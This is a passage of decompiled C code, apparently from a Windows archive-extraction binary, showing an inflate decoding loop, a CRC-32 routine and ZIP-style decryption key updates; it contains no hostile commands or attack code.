    int32_t v54; // 0x40514d
    int32_t result; // 0x40514d
    int32_t v55; // 0x40514d
    int32_t v56; // 0x40514d
    int32_t v57; // 0x40514d
    int32_t v58; // 0x40514d
    int32_t v59; // 0x40514d
    int32_t v60; // 0x40514d
    int32_t v61; // 0x40514d
    int32_t v62; // 0x40514d
    int32_t v63; // 0x40514d
    int32_t v64; // 0x40514d
    int32_t v65; // 0x40514d
    int32_t v66; // 0x40514d
    int32_t v67; // 0x40514d
    int32_t v68; // 0x40514d
    int32_t v69; // 0x40514d
    int32_t v70; // 0x40514d
    int32_t v71; // 0x40514d
    int32_t v72; // 0x40514d
    int32_t v73; // 0x40514d
    int32_t v74; // 0x40514d
    int32_t v75; // 0x40514d
    int32_t v76; // 0x40514d
    int32_t v77; // 0x40514d
    int32_t v78; // 0x40514d
    int32_t v79; // 0x40514d
    char * v80; // 0x40514d
    char * v81; // 0x40514d
    char * v82; // 0x40514d
    char * v83; // 0x40514d
    char * v84; // 0x40514d
    char * v85; // 0x40514d
    char * v86; // 0x40514d
    char * v87; // 0x40514d
    int32_t v88; // 0x40514d
    char * v89; // 0x40514d
    int32_t v90; // 0x40514d
    int32_t v91; // 0x40514d
    int32_t v92; // 0x40514d
    int32_t v93; // 0x40514d
    int32_t v94; // 0x40514d
    int32_t v95; // 0x40514d
    int32_t v96; // 0x40514d
    int32_t v97; // 0x40514d
    int32_t v98; // 0x40514d
    int32_t v99; // 0x40514d
    int32_t v100; // 0x40514d
    int32_t v101; // 0x40514d
    int32_t v102; // 0x40514d
    char v103; // 0x40514d
    int32_t v104; // 0x40530f
    int32_t v105; // 0x4051e6
    uint32_t v106; // 0x405213
    int32_t v107; // 0x405216
    int32_t v108; // 0x40514d
    int32_t v109; // 0x405226
    int32_t v110; // 0x405251
    unsigned char v111; // 0x405258
    int32_t v112; // 0x405263
    int32_t v113; // 0x405233
    int32_t v114; // 0x40523d
    char * v115; // 0x40514d
    int32_t v116; // 0x405243
    uint32_t v117; // 0x40514d
    int32_t v118; // 0x4051f9
    int32_t v119; // 0x405206
    unsigned char v120; // 0x4051d5
    uint32_t v121; // 0x405295
    uint32_t v122; // 0x4053e1
    uint32_t v123; // 0x4053c5
    uint32_t v124; // 0x405223
    int32_t v125; // 0x4052b4
    int32_t v126; // 0x4052c0
    int32_t v127; // 0x40514d
    int32_t v128; // 0x4052ce
    int32_t v129; // 0x4052d6
    uint32_t v130; // 0x4052d8
    int32_t v131; // 0x40529f
    int32_t v132; // 0x4052a9
    char * v133; // 0x40514d
    int32_t v134; // 0x4052af
    uint32_t v135; // 0x405388
    uint32_t v136; // 0x405392
    int32_t v137; // 0x405273
    int32_t v138; // 0x405280
    int32_t v139; // 0x405287
    int32_t v140; // 0x40514d
    int32_t v141; // 0x405291
    int32_t v142; // 0x4052df
    int32_t v143; // 0x40534f
    int32_t v144; // 0x405351
    int32_t v145; // 0x4052e7
    int32_t v146; // 0x4052f0
    int32_t v147; // 0x4052fe
    int32_t v148; // 0x405300
    int32_t v149; // 0x40532b
    int32_t v150; // 0x40532d
    int32_t v151; // 0x40530d
    if (v34 == 0) {
        // 0x405358
        *v30 = *(char *)(v43 + 4);
        v88 = v2 + 1;
        v86 = v32;
        v97 = v31;
        v90 = v9 - 1;
        v70 = v45;
        v65 = v44 - v46;
    } else {
        v47 = v42;
        v69 = v39;
        v102 = v40;
        v105 = v41 - v38;
        while ((v102 & 16) == 0) {
            if ((v102 & 64) != 0) {
                // 0x4053b8
                v117 = *v5 - v31;
                if ((v102 & 32) == 0) {
                    // 0x4053d2
                    *(int32_t *)(a6 + 24) = (int32_t)"invalid literal/length code";
                    v122 = v105 / 8;
                    v89 = v30;
                    v87 = v32;
                    v98 = v31;
                    v71 = v69;
                    result = -3;
                    v60 = v122 >= v117 ? v117 : v122;
                    v66 = v105;
                    goto lab_0x4053ed;
                } else {
                    // 0x4053bd
                    v123 = v105 / 8;
                    v89 = v30;
                    v87 = v32;
                    v98 = v31;
                    v71 = v69;
                    result = 1;
                    v60 = v123 >= v117 ? v117 : v123;
                    v66 = v105;
                    goto lab_0x4053ed;
                }
            }
            // 0x4051f9
            v118 = *(int32_t *)(4 * v102 + (int32_t)&unlzx_table_three_at_40bca8);
            v119 = 8 * ((v118 & v69) + *(int32_t *)(v47 + 4)) + v47;
            v103 = *(char *)v119;
            v120 = *(char *)(v119 + 1);
            v43 = v119;
            if (v103 == 0) {
                goto lab_0x405358;
            }
            v47 = v119;
            v69 >>= (int32_t)(v120 & 31);
            v102 = v103;
            v105 -= (int32_t)v120;
        }
        // 0x405213
        v106 = v102 & 15;
        v107 = *(int32_t *)(4 * v106 + (int32_t)&unlzx_table_three_at_40bca8);
        v108 = v69 >> v106;
        v109 = v105 - v106;
        v61 = v109;
        v72 = v108;
        v91 = v31;
        v80 = v32;
        v81 = v32;
        v92 = v31;
        v73 = v108;
        v62 = v109;
        if (v109 < 15) {
            v113 = v91 - 1;
            v114 = (int32_t)*v80 << (v61 & 31) | v72;
            v115 = (char *)((int32_t)v80 + 1);
            v116 = v61 + 8;
            v61 = v116;
            v72 = v114;
            v91 = v113;
            v80 = v115;
            v81 = v115;
            v92 = v113;
            v73 = v114;
            v62 = v116;
            while (v116 < 15) {
                // 0x405230
                v113 = v91 - 1;
                v114 = (int32_t)*v80 << (v61 & 31) | v72;
                v115 = (char *)((int32_t)v80 + 1);
                v116 = v61 + 8;
                v61 = v116;
                v72 = v114;
                v91 = v113;
                v80 = v115;
                v81 = v115;
                v92 = v113;
                v73 = v114;
                v62 = v116;
            }
        }
        // 0x405248
        v93 = v92;
        v82 = v81;
        v110 = 8 * (v73 & v12) + a4;
        v111 = *(char *)(v110 + 1);
        v74 = v73 >> (int32_t)(v111 & 31);
        v112 = v62 - (int32_t)v111;
        v56 = (int32_t)*(char *)v110;
        v57 = v56;
        v99 = v112;
        v48 = v110;
        v75 = v74;
        v77 = v74;
        v50 = v110;
        v101 = v112;
        v58 = v56;
        if ((v56 & 16) == 0) {
            v76 = v75;
            v100 = v99;
            if ((v57 & 64) != 0) {
                // 0x405383
                v135 = *v5 - v93;
                *(int32_t *)(a6 + 24) = (int32_t)"invalid distance code";
                v136 = v100 / 8;
                v89 = v30;
                v87 = v82;
                v98 = v93;
                v71 = v76;
                result = -3;
                v60 = v136 >= v135 ? v135 : v136;
                v66 = v100;
                goto lab_0x4053ed;
            }
            // 0x405273
            v49 = v48;
            v137 = *(int32_t *)(4 * v57 + (int32_t)&unlzx_table_three_at_40bca8);
            v138 = 8 * ((v137 & v76) + *(int32_t *)(v49 + 4)) + v49;
            v139 = (int32_t)*(char *)(v138 + 1);
            v140 = v76 >> (v139 & 31);
            v141 = v100 - v139;
            v55 = (int32_t)*(char *)v138;
            v57 = v55;
            v77 = v140;
            v50 = v138;
            v101 = v141;
            v58 = v55;
            while ((v55 & 16) == 0) {
                // 0x40526a
                v76 = v140;
                v100 = v141;
                if ((v57 & 64) != 0) {
                    // 0x405383
                    v135 = *v5 - v93;
                    *(int32_t *)(a6 + 24) = (int32_t)"invalid distance code";
                    v136 = v100 / 8;
                    v89 = v30;
                    v87 = v82;
                    v98 = v93;
                    v71 = v76;
                    result = -3;
                    v60 = v136 >= v135 ? v135 : v136;
                    v66 = v100;
                    goto lab_0x4053ed;
                }
                // 0x405273
                v49 = v138;
                v137 = *(int32_t *)(4 * v57 + (int32_t)&unlzx_table_three_at_40bca8);
                v138 = 8 * ((v137 & v76) + *(int32_t *)(v49 + 4)) + v49;
                v139 = (int32_t)*(char *)(v138 + 1);
                v140 = v76 >> (v139 & 31);
                v141 = v100 - v139;
                v55 = (int32_t)*(char *)v138;
                v57 = v55;
                v77 = v140;
                v50 = v138;
                v101 = v141;
                v58 = v55;
            }
        }
        // 0x405295
        v121 = v58 & 15;
        v63 = v101;
        v78 = v77;
        v94 = v93;
        v83 = v82;
        v84 = v82;
        v95 = v93;
        v79 = v77;
        v64 = v101;
        if (v101 < v121) {
            v131 = v94 - 1;
            v132 = (int32_t)*v83 << (v63 & 31) | v78;
            v133 = (char *)((int32_t)v83 + 1);
            v134 = v63 + 8;
            v63 = v134;
            v78 = v132;
            v94 = v131;
            v83 = v133;
            v84 = v133;
            v95 = v131;
            v79 = v132;
            v64 = v134;
            while (v134 < v121) {
                // 0x40529c
                v131 = v94 - 1;
                v132 = (int32_t)*v83 << (v63 & 31) | v78;
                v133 = (char *)((int32_t)v83 + 1);
                v134 = v63 + 8;
                v63 = v134;
                v78 = v132;
                v94 = v131;
                v83 = v133;
                v84 = v133;
                v95 = v131;
                v79 = v132;
                v64 = v134;
            }
        }
        // 0x4052b4
        v124 = (v107 & v69) + *(int32_t *)(v47 + 4);
        v96 = v95;
        v85 = v84;
        v125 = *(int32_t *)(4 * v121 + (int32_t)&unlzx_table_three_at_40bca8);
        v126 = v64 - v121;
        v127 = v79 >> v121;
        v128 = v9 - v124;
        v129 = v2 - *(int32_t *)(v50 + 4) - (v125 & v79);
        v130 = *v13;
        if (v129 >= v130) {
            // 0x40533a
            *v30 = *(char *)v129;
            *(char *)(v2 + 1) = *(char *)(v129 + 1);
            v144 = v124 - 2;
            v54 = v129 + 2;
            v143 = v2 + 2;
            *(char *)v143 = *(char *)v54;
            v143++;
            v144--;
            v54++;
            v88 = v143;
            v86 = v85;
            v97 = v96;
            v90 = v128;
            v70 = v127;
            v65 = v126;
            while (v144 != 0) {
                // 0x40534b
                *(char *)v143 = *(char *)v54;
                v143++;
                v144--;
                v54++;
                v88 = v143;
                v86 = v85;
                v97 = v96;
                v90 = v128;
                v70 = v127;
                v65 = v126;
            }
        } else {
            // 0x4052df
            v142 = *v8;
            v145 = v129 + v142 - v130;
            v51 = v145;
            while (v145 < v130) {
                // 0x4052e7
                v145 = v51 + v142 - v130;
                v51 = v145;
            }
            // 0x4052ed
            v146 = v142 - v145;
            v52 = v145;
            v67 = v146;
            if (v124 > v146) {
                *(char *)v2 = *(char *)v52;
                v147 = v2 + 1;
                v148 = v67 - 1;
                v52++;
                v59 = v147;
                v67 = v148;
                while (v148 != 0) {
                    // 0x4052fa
                    *(char *)v59 = *(char *)v52;
                    v147 = v59 + 1;
                    v148 = v67 - 1;
                    v52++;
                    v59 = v147;
                    v67 = v148;
                }
                // 0x405303
                v104 = v124 - v146;
                v151 = v147;
                v68 = *v13;
                *(char *)v151 = *(char *)v68;
                v151++;
                v104--;
                v68++;
                v88 = v151;
                v86 = v85;
                v97 = v96;
                v90 = v128;
                v70 = v127;
                v65 = v126;
                while (v104 != 0) {
                    // 0x405309
                    *(char *)v151 = *(char *)v68;
                    v151++;
                    v104--;
                    v68++;
                    v88 = v151;
                    v86 = v85;
                    v97 = v96;
                    v90 = v128;
                    v70 = v127;
                    v65 = v126;
                }
            } else {
                // 0x405316
                *v30 = *(char *)v145;
                *(char *)(v2 + 1) = *(char *)(v145 + 1);
                v150 = v124 - 2;
                v53 = v145 + 2;
                v149 = v2 + 2;
                *(char *)v149 = *(char *)v53;
                v149++;
                v150--;
                v53++;
                v88 = v149;
                v86 = v85;
                v97 = v96;
                v90 = v128;
                v70 = v127;
                v65 = v126;
                while (v150 != 0) {
                    // 0x405327
                    *(char *)v149 = *(char *)v53;
                    v149++;
                    v150--;
                    v53++;
                    v88 = v149;
                    v86 = v85;
                    v97 = v96;
                    v90 = v128;
                    v70 = v127;
                    v65 = v126;
                }
            }
        }
    }
    // 0x40536f
    v17 = v65;
    v16 = v70;
    v15 = v97;
    v14 = v86;
    int32_t v152 = v88;
    while (v15 >= 10 && v90 >= 258) {
        int32_t v153 = v90;
        int32_t v154 = v152;
        v18 = v17;
        v19 = v16;
        v20 = v15;
        v21 = v14;
        v22 = v14;
        v23 = v15;
        v24 = v16;
        v25 = v17;
        if (v17 < 20) {
            v26 = v20 - 1;
            v27 = (int32_t)*v21 << (v18 & 31) | v19;
            v28 = (char *)((int32_t)v21 + 1);
            v29 = v18 + 8;
            v18 = v29;
            v19 = v27;
            v20 = v26;
            v21 = v28;
            v22 = v28;
            v23 = v26;
            v24 = v27;
            v25 = v29;
            while (v29 < 20) {
                // 0x4051a9
                v26 = v20 - 1;
                v27 = (int32_t)*v21 << (v18 & 31) | v19;
                v28 = (char *)((int32_t)v21 + 1);
                v29 = v18 + 8;
                v18 = v29;
                v19 = v27;
                v20 = v26;
                v21 = v28;
                v22 = v28;
                v23 = v26;
                v24 = v27;
                v25 = v29;
            }
        }
        // 0x4051c1
        v30 = (char *)v154;
        v31 = v23;
        v32 = v22;
        v33 = 8 * (v24 & v11) + a3;
        v34 = *(char *)v33;
        v35 = *(char *)(v33 + 1);
        v36 = v24 >> (int32_t)(v35 & 31);
        v37 = v35;
        v38 = v37;
        v39 = v36;
        v40 = v34;
        v41 = v25;
        v42 = v33;
        v43 = v33;
        v44 = v25;
        v45 = v36;
        v46 = v37;
        if (v34 == 0) {
            // 0x405358
            *v30 = *(char *)(v43 + 4);
            v88 = v154 + 1;
            v86 = v32;
            v97 = v31;
            v90 = v153 - 1;
            v70 = v45;
            v65 = v44 - v46;
        } else {
            v47 = v42;
            v69 = v39;
            v102 = v40;
            v105 = v41 - v38;
            while ((v102 & 16) == 0) {
                if ((v102 & 64) != 0) {
                    // 0x4053b8
                    v117 = *v5 - v31;
                    if ((v102 & 32) == 0) {
                        // 0x4053d2
                        *(int32_t *)(a6 + 24) = (int32_t)"invalid literal/length code";
                        v122 = v105 / 8;
                        v89 = v30;
                        v87 = v32;
                        v98 = v31;
                        v71 = v69;
                        result = -3;
                        v60 = v122 >= v117 ? v117 : v122;
                        v66 = v105;
                        goto lab_0x4053ed;
                    } else {
                        // 0x4053bd
                        v123 = v105 / 8;
                        v89 = v30;
                        v87 = v32;
                        v98 = v31;
                        v71 = v69;
                        result = 1;
                        v60 = v123 >= v117 ? v117 : v123;
                        v66 = v105;
                        goto lab_0x4053ed;
                    }
                }
                // 0x4051f9
                v118 = *(int32_t *)(4 * v102 + (int32_t)&unlzx_table_three_at_40bca8);
                v119 = 8 * ((v118 & v69) + *(int32_t *)(v47 + 4)) + v47;
                v103 = *(char *)v119;
                v120 = *(char *)(v119 + 1);
                v43 = v119;
                if (v103 == 0) {
                    goto lab_0x405358;
                }
                v47 = v119;
                v69 >>= (int32_t)(v120 & 31);
                v102 = v103;
                v105 -= (int32_t)v120;
            }
            // 0x405213
            v106 = v102 & 15;
            v107 = *(int32_t *)(4 * v106 + (int32_t)&unlzx_table_three_at_40bca8);
            v108 = v69 >> v106;
            v109 = v105 - v106;
            v61 = v109;
            v72 = v108;
            v91 = v31;
            v80 = v32;
            v81 = v32;
            v92 = v31;
            v73 = v108;
            v62 = v109;
            if (v109 < 15) {
                v113 = v91 - 1;
                v114 = (int32_t)*v80 << (v61 & 31) | v72;
                v115 = (char *)((int32_t)v80 + 1);
                v116 = v61 + 8;
                v61 = v116;
                v72 = v114;
                v91 = v113;
                v80 = v115;
                v81 = v115;
                v92 = v113;
                v73 = v114;
                v62 = v116;
                while (v116 < 15) {
                    // 0x405230
                    v113 = v91 - 1;
                    v114 = (int32_t)*v80 << (v61 & 31) | v72;
                    v115 = (char *)((int32_t)v80 + 1);
                    v116 = v61 + 8;
                    v61 = v116;
                    v72 = v114;
                    v91 = v113;
                    v80 = v115;
                    v81 = v115;
                    v92 = v113;
                    v73 = v114;
                    v62 = v116;
                }
            }
            // 0x405248
            v93 = v92;
            v82 = v81;
            v110 = 8 * (v73 & v12) + a4;
            v111 = *(char *)(v110 + 1);
            v74 = v73 >> (int32_t)(v111 & 31);
            v112 = v62 - (int32_t)v111;
            v56 = (int32_t)*(char *)v110;
            v57 = v56;
            v99 = v112;
            v48 = v110;
            v75 = v74;
            v77 = v74;
            v50 = v110;
            v101 = v112;
            v58 = v56;
            if ((v56 & 16) == 0) {
                v76 = v75;
                v100 = v99;
                if ((v57 & 64) != 0) {
                    // 0x405383
                    v135 = *v5 - v93;
                    *(int32_t *)(a6 + 24) = (int32_t)"invalid distance code";
                    v136 = v100 / 8;
                    v89 = v30;
                    v87 = v82;
                    v98 = v93;
                    v71 = v76;
                    result = -3;
                    v60 = v136 >= v135 ? v135 : v136;
                    v66 = v100;
                    goto lab_0x4053ed;
                }
                // 0x405273
                v49 = v48;
                v137 = *(int32_t *)(4 * v57 + (int32_t)&unlzx_table_three_at_40bca8);
                v138 = 8 * ((v137 & v76) + *(int32_t *)(v49 + 4)) + v49;
                v139 = (int32_t)*(char *)(v138 + 1);
                v140 = v76 >> (v139 & 31);
                v141 = v100 - v139;
                v55 = (int32_t)*(char *)v138;
                v57 = v55;
                v77 = v140;
                v50 = v138;
                v101 = v141;
                v58 = v55;
                while ((v55 & 16) == 0) {
                    // 0x40526a
                    v76 = v140;
                    v100 = v141;
                    if ((v57 & 64) != 0) {
                        // 0x405383
                        v135 = *v5 - v93;
                        *(int32_t *)(a6 + 24) = (int32_t)"invalid distance code";
                        v136 = v100 / 8;
                        v89 = v30;
                        v87 = v82;
                        v98 = v93;
                        v71 = v76;
                        result = -3;
                        v60 = v136 >= v135 ? v135 : v136;
                        v66 = v100;
                        goto lab_0x4053ed;
                    }
                    // 0x405273
                    v49 = v138;
                    v137 = *(int32_t *)(4 * v57 + (int32_t)&unlzx_table_three_at_40bca8);
                    v138 = 8 * ((v137 & v76) + *(int32_t *)(v49 + 4)) + v49;
                    v139 = (int32_t)*(char *)(v138 + 1);
                    v140 = v76 >> (v139 & 31);
                    v141 = v100 - v139;
                    v55 = (int32_t)*(char *)v138;
                    v57 = v55;
                    v77 = v140;
                    v50 = v138;
                    v101 = v141;
                    v58 = v55;
                }
            }
            // 0x405295
            v121 = v58 & 15;
            v63 = v101;
            v78 = v77;
            v94 = v93;
            v83 = v82;
            v84 = v82;
            v95 = v93;
            v79 = v77;
            v64 = v101;
            if (v101 < v121) {
                v131 = v94 - 1;
                v132 = (int32_t)*v83 << (v63 & 31) | v78;
                v133 = (char *)((int32_t)v83 + 1);
                v134 = v63 + 8;
                v63 = v134;
                v78 = v132;
                v94 = v131;
                v83 = v133;
                v84 = v133;
                v95 = v131;
                v79 = v132;
                v64 = v134;
                while (v134 < v121) {
                    // 0x40529c
                    v131 = v94 - 1;
                    v132 = (int32_t)*v83 << (v63 & 31) | v78;
                    v133 = (char *)((int32_t)v83 + 1);
                    v134 = v63 + 8;
                    v63 = v134;
                    v78 = v132;
                    v94 = v131;
                    v83 = v133;
                    v84 = v133;
                    v95 = v131;
                    v79 = v132;
                    v64 = v134;
                }
            }
            // 0x4052b4
            v124 = (v107 & v69) + *(int32_t *)(v47 + 4);
            v96 = v95;
            v85 = v84;
            v125 = *(int32_t *)(4 * v121 + (int32_t)&unlzx_table_three_at_40bca8);
            v126 = v64 - v121;
            v127 = v79 >> v121;
            int32_t v155 = *(int32_t *)(v50 + 4); // 0x4052c5
            v128 = v153 - v124;
            v129 = v154 - v155 - (v125 & v79);
            v130 = *v13;
            if (v129 >= v130) {
                // 0x40533a
                *v30 = *(char *)v129;
                *(char *)(v154 + 1) = *(char *)(v129 + 1);
                v144 = v124 - 2;
                v54 = v129 + 2;
                v143 = v154 + 2;
                *(char *)v143 = *(char *)v54;
                v143++;
                v144--;
                v54++;
                v88 = v143;
                v86 = v85;
                v97 = v96;
                v90 = v128;
                v70 = v127;
                v65 = v126;
                while (v144 != 0) {
                    // 0x40534b
                    *(char *)v143 = *(char *)v54;
                    v143++;
                    v144--;
                    v54++;
                    v88 = v143;
                    v86 = v85;
                    v97 = v96;
                    v90 = v128;
                    v70 = v127;
                    v65 = v126;
                }
            } else {
                // 0x4052df
                v142 = *v8;
                v145 = v129 + v142 - v130;
                v51 = v145;
                while (v145 < v130) {
                    // 0x4052e7
                    v145 = v51 + v142 - v130;
                    v51 = v145;
                }
                // 0x4052ed
                v146 = v142 - v145;
                v52 = v145;
                v59 = v154;
                v67 = v146;
                if (v124 > v146) {
                    *(char *)v59 = *(char *)v52;
                    v147 = v59 + 1;
                    v148 = v67 - 1;
                    v52++;
                    v59 = v147;
                    v67 = v148;
                    while (v148 != 0) {
                        // 0x4052fa
                        *(char *)v59 = *(char *)v52;
                        v147 = v59 + 1;
                        v148 = v67 - 1;
                        v52++;
                        v59 = v147;
                        v67 = v148;
                    }
                    // 0x405303
                    v104 = v124 - v146;
                    v151 = v147;
                    v68 = *v13;
                    *(char *)v151 = *(char *)v68;
                    v151++;
                    v104--;
                    v68++;
                    v88 = v151;
                    v86 = v85;
                    v97 = v96;
                    v90 = v128;
                    v70 = v127;
                    v65 = v126;
                    while (v104 != 0) {
                        // 0x405309
                        *(char *)v151 = *(char *)v68;
                        v151++;
                        v104--;
                        v68++;
                        v88 = v151;
                        v86 = v85;
                        v97 = v96;
                        v90 = v128;
                        v70 = v127;
                        v65 = v126;
                    }
                } else {
                    // 0x405316
                    *v30 = *(char *)v145;
                    *(char *)(v154 + 1) = *(char *)(v145 + 1);
                    v150 = v124 - 2;
                    v53 = v145 + 2;
                    v149 = v154 + 2;
                    *(char *)v149 = *(char *)v53;
                    v149++;
                    v150--;
                    v53++;
                    v88 = v149;
                    v86 = v85;
                    v97 = v96;
                    v90 = v128;
                    v70 = v127;
                    v65 = v126;
                    while (v150 != 0) {
                        // 0x405327
                        *(char *)v149 = *(char *)v53;
                        v149++;
                        v150--;
                        v53++;
                        v88 = v149;
                        v86 = v85;
                        v97 = v96;
                        v90 = v128;
                        v70 = v127;
                        v65 = v126;
                    }
                }
            }
        }
        // 0x40536f
        v17 = v65;
        v16 = v70;
        v15 = v97;
        v14 = v86;
        v152 = v88;
    }
    uint32_t v156 = *v5 - v15; // 0x4053a8
    uint32_t v157 = v17 / 8; // 0x4053ab
    v89 = (char *)v152;
    v87 = v14;
    v98 = v15;
    v71 = v16;
    result = 0;
    v60 = v157 >= v156 ? v156 : v157;
    v66 = v17;
    goto lab_0x4053ed;
  lab_0x4053ed:;
    int32_t v158 = (int32_t)v87 - v60; // 0x4053f0
    *v6 = v71;
    *v3 = v66 - 8 * v60;
    *v5 = v60 + v98;
    *v4 = v158;
    int32_t * v159 = (int32_t *)(a6 + 8); // 0x405414
    *v159 = v158 - *v4 + *v159;
    *v1 = (int32_t)v89;
    return result;
}

// Address range: 0x40541f - 0x405535
// Used cryptographic patterns:
//  - CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t function_40541f(int32_t a1, int32_t a2, uint32_t a3) {
    if (a2 == 0) {
        // 0x405429
        return 0;
    }
    int32_t v1 = -1 - a1;
    int32_t v2 = a3; // 0x40543d
    int32_t v3 = v1; // 0x40543d
    int32_t v4 = a2; // 0x40543d
    if (a3 >= 8) {
        int32_t v5 = a3; // 0x405447
        int32_t v6 = a2; // 0x405447
        int32_t v7 = a3 / 8; // 0x405447
        unsigned char v8 = *(char *)v6; // 0x40544a
        v5 -= 8;
        int32_t v9 = *(int32_t *)(4 * (v1 & 255 ^ (int32_t)v8) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x40545c
        uint32_t v10 = v9 ^ v1 / 256; // 0x405463
        unsigned char v11 = *(char *)(v6 + 1); // 0x405468
        unsigned char v12 = *(char *)(v6 + 2); // 0x40546f
        int32_t v13 = *(int32_t *)(4 * (v10 & 255 ^ (int32_t)v11) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x405473
        uint32_t v14 = v13 ^ v10 / 256; // 0x40547d
        unsigned char v15 = *(char *)(v6 + 3); // 0x405486
        int32_t v16 = *(int32_t *)(4 * (v14 & 255 ^ (int32_t)v12) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x40548a
        uint32_t v17 = v16 ^ v14 / 256; // 0x405494
        unsigned char v18 = *(char *)(v6 + 4); // 0x40549d
        int32_t v19 = *(int32_t *)(4 * (v17 & 255 ^ (int32_t)v15) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x4054a1
        uint32_t v20 = v19 ^ v17 / 256; // 0x4054ab
        unsigned char v21 = *(char *)(v6 + 5); // 0x4054b4
        int32_t v22 = *(int32_t *)(4 * (v20 & 255 ^ (int32_t)v18) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x4054b8
        uint32_t v23 = v22 ^ v20 / 256; // 0x4054c2
        unsigned char v24 = *(char *)(v6 + 6); // 0x4054cb
        int32_t v25 = *(int32_t *)(4 * (v23 & 255 ^ (int32_t)v21) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x4054cf
        uint32_t v26 = v25 ^ v23 / 256; // 0x4054d9
        unsigned char v27 = *(char *)(v6 + 7); // 0x4054e2
        int32_t v28 = *(int32_t *)(4 * (v26 & 255 ^ (int32_t)v24) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x4054e6
        uint32_t v29 = v28 ^ v26 / 256; // 0x4054f0
        int32_t v30 = *(int32_t *)(4 * (v29 & 255 ^ (int32_t)v27) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x4054fc
        int32_t v31 = v29 / 256 ^ v30; // 0x405503
        v6 += 8;
        v7--;
        v2 = v5;
        v3 = v31;
        v4 = v6;
        while (v7 != 0) {
            // 0x40544a
            v8 = *(char *)v6;
            v5 -= 8;
            v9 = *(int32_t *)(4 * (v31 & 255 ^ (int32_t)v8) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v10 = v9 ^ v31 / 256;
            v11 = *(char *)(v6 + 1);
            v12 = *(char *)(v6 + 2);
            v13 = *(int32_t *)(4 * (v10 & 255 ^ (int32_t)v11) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v14 = v13 ^ v10 / 256;
            v15 = *(char *)(v6 + 3);
            v16 = *(int32_t *)(4 * (v14 & 255 ^ (int32_t)v12) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v17 = v16 ^ v14 / 256;
            v18 = *(char *)(v6 + 4);
            v19 = *(int32_t *)(4 * (v17 & 255 ^ (int32_t)v15) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v20 = v19 ^ v17 / 256;
            v21 = *(char *)(v6 + 5);
            v22 = *(int32_t *)(4 * (v20 & 255 ^ (int32_t)v18) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v23 = v22 ^ v20 / 256;
            v24 = *(char *)(v6 + 6);
            v25 = *(int32_t *)(4 * (v23 & 255 ^ (int32_t)v21) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v26 = v25 ^ v23 / 256;
            v27 = *(char *)(v6 + 7);
            v28 = *(int32_t *)(4 * (v26 & 255 ^ (int32_t)v24) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v29 = v28 ^ v26 / 256;
            v30 = *(int32_t *)(4 * (v29 & 255 ^ (int32_t)v27) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
            v31 = v29 / 256 ^ v30;
            v6 += 8;
            v7--;
            v2 = v5;
            v3 = v31;
            v4 = v6;
        }
    }
    int32_t v32 = v2; // 0x405512
    int32_t v33 = v3; // 0x405512
    if (v2 == 0) {
        // 0x40552f
        return -1 - v3;
    }
    int32_t v34 = v4; // 0x405512
    unsigned char v35 = *(char *)v34; // 0x405514
    int32_t v36 = *(int32_t *)(4 * (v33 & 255 ^ (int32_t)v35) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x405520
    v33 = v36 ^ v33 / 256;
    v32--;
    v34++;
    while (v32 != 0) {
        // 0x405514
        v35 = *(char *)v34;
        v36 = *(int32_t *)(4 * (v33 & 255 ^ (int32_t)v35) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054);
        v33 = v36 ^ v33 / 256;
        v32--;
        v34++;
    }
    // 0x40552f
    return -1 - v33;
}

// Address range: 0x405535 - 0x405588
// Used cryptographic patterns:
//  - CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t function_405535(int32_t a1, unsigned char a2) {
    int32_t * v1 = (int32_t *)a1; // 0x405540
    uint32_t v2 = *v1; // 0x405540
    int32_t v3 = *(int32_t *)(4 * (v2 & 255 ^ (int32_t)a2) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x405550
    int32_t v4 = v3 ^ v2 / 256; // 0x405557
    int32_t * v5 = (int32_t *)(a1 + 8); // 0x405559
    uint32_t v6 = *v5; // 0x405559
    *v1 = v4;
    int32_t * v7 = (int32_t *)(a1 + 4); // 0x405560
    uint32_t v8 = 0x8088405 * (*v7 + (v4 & 255)) + 1; // 0x40556d
    *v7 = v8;
    int32_t v9 = *(int32_t *)(4 * (v8 / 0x1000000 ^ v6 & 255) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054); // 0x40557a
    int32_t result = v9 ^ v6 / 256; // 0x405581
    *v5 = result;
    return result;
}

// Address range: 0x405588 - 0x4055a3
int32_t function_405588(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 8) & 0xfffd; // 0x405594
    return (v1 ^ 3) * (v1 | 2) / 256 & 255;
}

// Address range: 0x4055a3 - 0x4055c4
int32_t function_4055a3(int32_t a1, int32_t a2) {
    int32_t v1 = function_405588(a1) ^ a2;
    return function_405535(a1, (char)v1) & -256 | v1 & 255;
}

// Address range: 0x4055c4 - 0x4056dd
int32_t function_4055c4(uint32_t a1, int32_t a2, int32_t a3) {
    // 0x4055c4
    if (a2 == 0) {
        // 0x4056d9
